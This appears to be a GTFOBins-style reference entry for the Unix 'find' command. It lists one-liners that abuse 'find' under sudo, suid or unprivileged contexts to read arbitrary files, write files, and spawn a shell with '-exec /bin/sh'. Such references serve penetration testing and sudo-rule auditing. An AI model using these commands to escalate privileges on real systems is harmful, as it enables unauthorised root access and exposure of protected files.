title: find
html:
find

File Read

Context: sudo, suid, unprivileged

find /path/to/input-file -exec cat {} \;

File Write

Context: sudo, suid, unprivileged

find / -fprintf /path/to/output-file DATA -quit

Shell

Context: sudo, suid, unprivileged

find . -exec /bin/sh \; -quit
excerpt: find File Read Context: sudo, suid, unprivileged find /path/to/input-file -exec cat {} \; File Write Context: sudo, suid, unprivileged find / -fprintf /path/to/output-file DATA -quit Shell Context: su
